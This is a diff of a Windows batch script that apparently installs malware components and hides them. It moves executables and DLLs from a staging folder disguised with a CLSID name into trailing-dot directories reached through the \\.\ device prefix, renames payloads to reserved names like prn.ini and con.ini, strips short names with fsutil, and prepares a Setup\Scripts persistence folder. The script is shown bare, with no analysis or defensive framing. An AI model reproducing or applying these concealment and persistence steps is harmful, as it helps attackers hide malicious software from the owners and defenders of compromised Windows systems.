@@ -4,16 +4,16 @@ mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
 mkdir %WINDIR%\Setup\Scripts
 
-copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\"
-move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
+copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
-move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
-move /Y "%ProgramData%\Comms\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
 
-move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\vcruntime140.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
 rd /s /q "%ProgramData%\Comms"
 
 fsutil file setshortname C:\ProgramData\config..\ ""
